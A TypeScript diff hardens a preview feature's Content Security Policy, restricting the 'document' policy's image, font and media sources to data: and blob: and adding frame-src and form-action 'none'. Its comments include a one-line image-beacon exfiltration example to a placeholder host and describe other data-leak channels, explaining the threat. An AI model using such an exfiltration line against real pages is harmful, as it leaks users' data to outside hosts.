@@ -45,18 +45,36 @@ export type PreviewPolicy = 'bundle' | 'document';
 const BASE_CSP = [
   "default-src 'none'",
   "style-src 'unsafe-inline' https:",
+  "frame-src 'none'",
+  "form-action 'none'",
+];
+
+/// Remote fetches a previewed page may make for *display*. Allowed on
+/// `bundle`, withheld from `document`: on `document` every one of these is a
+/// one-line exfiltration channel (`new Image().src = 'https://…?d=' + data`)
+/// that `connect-src 'none'` does not govern.
+const REMOTE_DISPLAY_CSP = [
   'img-src data: blob: https:',
   'font-src data: https:',
   'media-src data: blob: https:',
-  "frame-src 'none'",
 ];
 
+const LOCAL_DISPLAY_CSP = ['img-src data: blob:', 'font-src data:', 'media-src data: blob:'];
+
 const CSP_BY_POLICY: Record<PreviewPolicy, string> = {
-  bundle: [...BASE_CSP, 'connect-src https:', "script-src 'unsafe-inline'"].join('; '),
-  // `document` runs REMOTE script, so it gets no egress at all: a page that
-  // inlines a local file must not be able to send it anywhere.
+  bundle: [...BASE_CSP, ...REMOTE_DISPLAY_CSP, 'connect-src https:', "script-src 'unsafe-inline'"].join('; '),
+  // `document` runs REMOTE script (see the type doc above — CDN pages are the
+  // point), and CSP has no directive that limits what a script does once it
+  // has loaded: `script-src https:` is itself a fetch of attacker-influenced
+  // content, and a running script can still exfiltrate by requesting a new
+  // `<script src>` or navigating an `<img>`/`<a>` with data appended to the
+  // URL. `connect-src 'none'` plus the data:/blob:-only image/font/media
+  // directives close every channel a document does NOT need in order to
+  // render; they narrow this policy, they do not seal it. Treat `document`
+  // as trusted-content-only, not as a sandbox for untrusted HTML.
   document: [
     ...BASE_CSP,
+    ...LOCAL_DISPLAY_CSP,
     "connect-src 'none'",
     "script-src 'unsafe-inline' 'unsafe-eval' https:",
   ].join('; '),
